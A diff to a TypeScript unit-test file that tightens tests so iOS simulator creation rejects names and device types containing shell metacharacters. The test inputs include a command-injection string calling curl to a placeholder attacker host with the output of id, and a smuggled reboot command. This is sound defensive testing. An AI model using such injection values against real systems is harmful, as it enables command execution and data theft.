@@ -56,15 +56,42 @@ describe('IOS utils tests', () => {
         ]);
     });
 
-    it('createNewDevice passes a malicious simulator name as a single inert argv element', async () => {
+    it('createNewDevice rejects a simulator name containing shell metacharacters', async () => {
         const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
             stderr: '',
             stdout: 'UDID'
         });
         const malicious = 'evil; curl http://attacker/$(id); #';
-        await IOSUtils.createNewDevice(malicious, 'iPhone-15', 'iOS-17');
-        // The value must appear verbatim as ONE argv element (never split or shell-interpreted).
-        expect(stub.firstCall.args[1]).to.include(malicious);
+
+        let caught: unknown;
+        try {
+            await IOSUtils.createNewDevice(malicious, 'iPhone-15', 'iOS-17');
+        } catch (error) {
+            caught = error;
+        }
+
+        expect(caught).to.be.an('error');
+        expect((caught as Error).message).to.match(/cannot be safely used/i);
+        // Must fail fast: the command is never built or spawned.
+        expect(stub.called).to.be.false;
+    });
+
+    it('createNewDevice rejects a device type containing shell metacharacters', async () => {
+        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
+            stderr: '',
+            stdout: 'UDID'
+        });
+
+        let caught: unknown;
+        try {
+            await IOSUtils.createNewDevice('MySim', 'iPhone-15; reboot', 'iOS-17');
+        } catch (error) {
+            caught = error;
+        }
+
+        expect(caught).to.be.an('error');
+        expect((caught as Error).message).to.match(/cannot be safely used/i);
+        expect(stub.called).to.be.false;
     });
 
     it('Should attempt to invoke xcrun to boot device but resolve if device is already booted', async () => {
